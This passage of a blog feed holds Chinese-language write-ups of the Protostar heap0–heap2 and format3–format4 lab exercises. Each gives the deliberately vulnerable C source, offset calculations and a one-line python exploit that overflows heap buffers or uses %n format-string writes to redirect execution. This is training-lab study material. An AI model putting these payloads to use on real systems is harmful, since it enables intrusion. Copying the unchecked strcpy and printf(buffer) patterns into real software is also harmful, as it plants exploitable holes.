&#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">  <span class="keyword">int</span> auth;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">auth</span> *<span class="title">auth</span>;</span></span><br><span class="line"><span class="keyword">char</span> *service;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"auth "</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          auth = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(auth));</span><br><span class="line">          <span class="built_in">memset</span>(auth, <span class="number">0</span>, <span class="keyword">sizeof</span>(auth));</span><br><span class="line">          <span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="built_in">line</span> + <span class="number">5</span>) &lt; <span class="number">31</span>) &#123;</span><br><span class="line">              <span class="built_in">strcpy</span>(auth-&gt;name, <span class="built_in">line</span> + <span class="number">5</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><p>但是因为命名不规范，所以程序计算的是<code>struct auth *auth</code>的大小</p><p>而不是计算<code>struct auth {  char name[32];  int auth;};</code>的大小</p><p>因此它只有4个字节，但是malloc将它与8字节对齐</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>本意应该是使用UAF,但是我们给service提供长一点的字节，就可以覆盖<code>auth-&gt;auth</code>了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ python -c &#39;print &quot;auth A\n&quot; + &quot;service&quot; + &quot;A&quot;*32 + &quot;\n&quot; + &quot;login&quot;&#39; | .&#x2F;heap2</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/heap2_6.jpg" data-fancybox="group" data-caption="heap2_6" class="fancybox"><img alt="heap2_6" title="heap2_6" data-src="https://dblu3.github.io/img/Protostar/heap2_6.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Heap2&quot;&gt;&lt;a href=&quot;#Heap2&quot; class=&quot;headerlink&quot; title=&quot;Heap2&quot;&gt;&lt;/a&gt;Heap2&lt;/h1&gt;&lt;p&gt;Heap2: Use-After-Free(UAF)&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_heap1</title>
    <link href="http://yoursite.com/2018/09/15/Protostar-heap1/"/>
    <id>http://yoursite.com/2018/09/15/Protostar-heap1/</id>
    <published>2018-09-15T02:44:40.000Z</published>
    <updated>2018-09-15T13:24:25.598Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Heap1"><a href="#Heap1" class="headerlink" title="Heap1"></a>Heap1</h1><p>Heap1是一个堆溢出漏洞</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Heap1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">internet</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> priority;</span><br><span class="line">  <span class="keyword">char</span> *name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"and we have a winner @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">internet</span> *<span class="title">i1</span>, *<span class="title">i2</span>, *<span class="title">i3</span>;</span></span><br><span class="line"></span><br><span class="line">  i1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct internet));</span><br><span class="line">  i1-&gt;priority = <span class="number">1</span>;</span><br><span class="line">  i1-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  i2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct internet));</span><br><span class="line">  i2-&gt;priority = <span class="number">2</span>;</span><br><span class="line">  i2-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(i1-&gt;name, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(i2-&gt;name, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"and that's a wrap folks!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p><a href="https://dblu3.github.io/img/Protostar/heap1_1.jpg" data-fancybox="group" data-caption="heap1_1" class="fancybox"><img alt="heap1_1" title="heap1_1" data-src="https://dblu3.github.io/img/Protostar/heap1_1.jpg" class="lazyload"></a><br>发现我们可以控制2个strcpy的参数写入任意地址</p><p>第一个strcpy的参数偏移是20(‘F’=0x46)</p><p>第二个strcpy的参数没有偏移</p><p><a href="https://dblu3.github.io/img/Protostar/heap1_2.jpg" data-fancybox="group" data-caption="heap1_2" class="fancybox"><img alt="heap1_2" title="heap1_2" data-src="https://dblu3.github.io/img/Protostar/heap1_2.jpg" class="lazyload"></a><br>反汇编main，发现调用的是puts</p><p>那么接下来的思路就很简单了</p><p>找到puts和winner的地址放到payload中就行了</p><h2 id="查找puts和winnner地址"><a href="#查找puts和winnner地址" class="headerlink" title="查找puts和winnner地址"></a>查找puts和winnner地址</h2><p><a href="https://dblu3.github.io/img/Protostar/heap1_3.jpg" data-fancybox="group" data-caption="heap1_3" class="fancybox"><img alt="heap1_3" title="heap1_3" data-src="https://dblu3.github.io/img/Protostar/heap1_3.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ .&#x2F;heap1 &#96;python -c &#39;print &quot;A&quot;*20 + &quot;\x74\x97\x04\x08&quot;&#39;&#96;  &#96;python -c &#39;print &quot;\x94\x84\x04\x08&quot;&#39;&#96;</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/heap1_4.jpg" data-fancybox="group" data-caption="heap1_4" class="fancybox"><img alt="heap1_4" title="heap1_4" data-src="https://dblu3.github.io/img/Protostar/heap1_4.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Heap1&quot;&gt;&lt;a href=&quot;#Heap1&quot; class=&quot;headerlink&quot; title=&quot;Heap1&quot;&gt;&lt;/a&gt;Heap1&lt;/h1&gt;&lt;p&gt;Heap1是一个堆溢出漏洞&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_heap0</title>
    <link href="http://yoursite.com/2018/09/14/Protostar-heap0/"/>
    <id>http://yoursite.com/2018/09/14/Protostar-heap0/</id>
    <published>2018-09-14T10:38:41.000Z</published>
    <updated>2018-09-14T15:01:27.714Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Heap0"><a href="#Heap0" class="headerlink" title="Heap0"></a>Heap0</h1><p>Heap0是一个简单的溢出漏洞</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Heap0</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fp</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> (*fp)();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"level passed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nowinner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"level has not been passed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">data</span> *<span class="title">d</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fp</span> *<span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct data));</span><br><span class="line">  f = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct fp));</span><br><span class="line">  f-&gt;fp = nowinner;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"data is at %p, fp is at %p\n"</span>, d, f);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(d-&gt;name, argv[<span class="number">1</span>]);</span><br><span class="line">  </span><br><span class="line">  f-&gt;fp();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>大致思路是利用溢出，使fp指向<code>winner()</code></p><h2 id="查找winner-地址"><a href="#查找winner-地址" class="headerlink" title="查找winner()地址"></a>查找winner()地址</h2><p><a href="https://dblu3.github.io/img/Protostar/heap0_1.jpg" data-fancybox="group" data-caption="heap0_1" class="fancybox"><img alt="heap0_1" title="heap0_1" data-src="https://dblu3.github.io/img/Protostar/heap0_1.jpg" class="lazyload"></a></p><h2 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>0x804a050-0x804a008=0x48(72)</p><p><a href="https://dblu3.github.io/img/Protostar/heap0_2.jpg" data-fancybox="group" data-caption="heap0_1" class="fancybox"><img alt="heap0_1" title="heap0_1" data-src="https://dblu3.github.io/img/Protostar/heap0_2.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>后面加上<code>winner()</code>的地址就ok了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ .&#x2F;heap0 $(python -c &#39;print &quot;A&quot;*72 + &quot;\x64\x84\x04\x08&quot;&#39;)</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/heap0_3.jpg" data-fancybox="group" data-caption="heap0_3" class="fancybox"><img alt="heap0_3" title="heap0_3" data-src="https://dblu3.github.io/img/Protostar/heap0_3.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Heap0&quot;&gt;&lt;a href=&quot;#Heap0&quot; class=&quot;headerlink&quot; title=&quot;Heap0&quot;&gt;&lt;/a&gt;Heap0&lt;/h1&gt;&lt;p&gt;Heap0是一个简单的溢出漏洞&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_format4</title>
    <link href="http://yoursite.com/2018/09/13/Protostar-format4/"/>
    <id>http://yoursite.com/2018/09/13/Protostar-format4/</id>
    <published>2018-09-13T06:38:30.000Z</published>
    <updated>2018-09-13T09:08:56.489Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Format4"><a href="#Format4" class="headerlink" title="Format4"></a>Format4</h1><p>与Format3差不多</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Format4</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code execution redirected! you win\n"</span>);</span><br><span class="line">  _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  fgets(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="built_in">buffer</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>观察源码，不难发现，我们想要调用<code>hello()</code>，可以通过把<code>exit(1)</code>的地址改成<code>hello()</code>的地址</p><h2 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h2><ul><li>objdump -TR is your friend</li></ul><h2 id="寻找hello-地址"><a href="#寻找hello-地址" class="headerlink" title="寻找hello()地址"></a>寻找hello()地址</h2><p><a href="https://dblu3.github.io/img/Protostar/format4_1.jpg" data-fancybox="group" data-caption="format4_1" class="fancybox"><img alt="format4_1" title="format4_1" data-src="https://dblu3.github.io/img/Protostar/format4_1.jpg" class="lazyload"></a></p><h2 id="寻找exit-地址"><a href="#寻找exit-地址" class="headerlink" title="寻找exit()地址"></a>寻找exit()地址</h2><p><a href="https://dblu3.github.io/img/Protostar/format4_2.jpg" data-fancybox="group" data-caption="format4_2" class="fancybox"><img alt="format4_2" title="format4_2" data-src="https://dblu3.github.io/img/Protostar/format4_2.jpg" class="lazyload"></a></p><h2 id="hello-的偏移"><a href="#hello-的偏移" class="headerlink" title="hello()的偏移"></a>hello()的偏移</h2><p><a href="https://dblu3.github.io/img/Protostar/format4_3.jpg" data-fancybox="group" data-caption="format4_3" class="fancybox"><img alt="format4_3" title="format4_3" data-src="https://dblu3.github.io/img/Protostar/format4_3.jpg" class="lazyload"></a></p><p>偏移是4，所以payload从%4开始</p><h2 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h2><p>目的是把exit(0x08049724)的地址改为hello(0x080484b4)</p><ul><li>0x8049724: 0xb4(180) 180-16=164</li><li>0x8049725: 0x84(132) 388(132+256)-180=208</li><li>0x8049726: 0x04(04)  260(4+256)-132=128</li><li>0x8049727: 0x08(08)  264(8+256)-04=260</li></ul><p>(0x8049727)的08要加上256是因为(0x8049726)的04&lt;132</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ python -c &#39;print </span><br><span class="line">&quot;\x24\x97\x04\x08&quot; + &quot;\x25\x97\x04\x08&quot; + &quot;\x26\x97\x04\x08&quot; + &quot;\x27\x97\x04\x08&quot; + </span><br><span class="line">&quot;%164x%4$n&quot; + &quot;%208x%5$n&quot; + &quot;%128x%6$n&quot; + &quot;%260x%7$n&quot; &#39; | .&#x2F;format4</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/format4_4.jpg" data-fancybox="group" data-caption="format4_4" class="fancybox"><img alt="format4_4" title="format4_4" data-src="https://dblu3.github.io/img/Protostar/format4_4.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Format4&quot;&gt;&lt;a href=&quot;#Format4&quot; class=&quot;headerlink&quot; title=&quot;Format4&quot;&gt;&lt;/a&gt;Format4&lt;/h1&gt;&lt;p&gt;与Format3差不多&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_format3</title>
    <link href="http://yoursite.com/2018/09/12/Protostar-format3/"/>
    <id>http://yoursite.com/2018/09/12/Protostar-format3/</id>
    <published>2018-09-12T11:43:43.000Z</published>
    <updated>2018-09-13T09:09:56.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Format3"><a href="#Format3" class="headerlink" title="Format3"></a>Format3</h1><p>与Format1、Format2做法基本相同</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Format3</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printbuffer</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="built_in">string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  fgets(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">  printbuffer(<span class="built_in">buffer</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(target == <span class="number">0x01025544</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"target is %08x :(\n"</span>, target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="查找”target“"><a href="#查找”target“" class="headerlink" title="查找”target“"></a>查找”target“</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ objdump -t format3 | grep target</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/format3_1.jpg" data-fancybox="group" data-caption="format3_1" class="fancybox"><img alt="format3_1" title="format3_1" data-src="https://dblu3.github.io/img/Protostar/format3_1.jpg" class="lazyload"></a></p><h2 id="定位target的注入位置"><a href="#定位target的注入位置" class="headerlink" title="定位target的注入位置"></a>定位target的注入位置</h2><p><a href="https://dblu3.github.io/img/Protostar/format3_2.jpg" data-fancybox="group" data-caption="format3_2" class="fancybox"><img alt="format3_2" title="format3_2" data-src="https://dblu3.github.io/img/Protostar/format3_2.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>主要是拆分0x01025544<br><a href="https://dblu3.github.io/img/Protostar/format3_3.jpg" data-fancybox="group" data-caption="format3_3" class="fancybox"><img alt="format3_3" title="format3_3" data-src="https://dblu3.github.io/img/Protostar/format3_3.jpg" class="lazyload"></a></p><p>前面得出偏移是12，所以从%12开始</p><p>把4个字节的数据写入</p><ul><li>080496f4: 0x44(68)  68-16=52</li><li>080496f5: 0x55(85)  85-68=17</li><li>080496f6: 0x02(02)  02&lt;58 与 f7一起 258(256+2)-85=173</li><li>080496f7: 0x01(01)  </li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ python -c &#39;print </span><br><span class="line">&quot;\xf4\x96\x04\x08&quot; + &quot;\xf5\x96\x04\x08&quot; + &quot;\xf6\x96\x04\x08&quot; + &quot;\xf7\x96\x04\x08&quot; + </span><br><span class="line">&quot;%52x%12$n&quot; + &quot;%17x%13$n&quot; + &quot;%173x%14$n&quot;  &#39; | .&#x2F;format3</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/format3_4.jpg" data-fancybox="group" data-caption="format3_4" class="fancybox"><img alt="format3_4" title="format3_4" data-src="https://dblu3.github.io/img/Protostar/format3_4.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Format3&quot;&gt;&lt;a href=&quot;#Format3&quot; class=&quot;headerlink&quot; title=&quot;Format3&quot;&gt;&lt;/a&gt;Format3&lt;/h1&gt;&lt;p&gt;与Format1、Format2做法基本相同&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_format2</title>
    <link href="http://yoursite.com/2018/09/12/Protostar-format2/"/>
